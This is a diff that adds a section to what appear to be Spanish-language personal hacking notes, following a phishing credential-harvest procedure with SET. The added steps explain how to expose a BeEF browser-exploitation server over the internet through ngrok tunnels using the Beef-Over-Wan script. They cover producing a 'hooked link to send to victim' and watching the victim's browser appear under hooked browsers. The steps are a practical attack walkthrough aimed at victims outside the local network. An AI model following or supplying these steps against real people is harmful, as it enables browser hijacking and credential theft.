@@ -702,6 +702,38 @@ rmdir <nombre directorio> (Borrar directorio)
 --- Acceder al link de ngrok
 --- Regresar al kali, a la terminal de set, en ella se verán las credenciales del usuario, si el mismo las ingresó al visitar el sitio web
 
+++ Uso de beef fuera de la red local
+--- URL: https://github.com/stormshadow07/Beef-Over-Wan
+--- Ir a la ubicación del programa
+--- chmod +x <nombre_ejecutable.py>
+--- nano /root/.ngrok2/ngrok.yml 
+--- Editar la seccion de tunnels
+tunnels:
+first-app:
+	addr: 80
+	proto: http
+second-app:
+	addr: 3000
+	proto: http
+--- Ctrl + G y Ctrl + X
+--- ngrok start --all
+--- Abrir otra terminal
+--- ./BeeFOverWan.py
+--- 1
+--- Volver a la terminal de ngrok y copiar la url de forwarding, la primera (ejemplo: 4427f328.ngrok.io)
+--- Pegar en la otra terminal
+--- Volver a la terminal de ngrok y copiar la url de forwarding, la ultima
+--- Pegar en la otra terminal
+--- Se nos mostrarán las credenciales de acceso al portal de beef y el hooked link a enviar a la víctima
+--- Ingresar a la interfaz web de beef
+--- Ingresar las credenciales (beef/beef)
+--- Regresar a la terminal de beef
+--- Copiar el enlace (hooked link to send to victim)
+--- Ir a la máquina de la víctima y acceder a dicho link
+--- Volver a la interfaz web de beef y allí nos aparecerá el acceso en la sección de hooked browsers
+
+
+
 
 
 
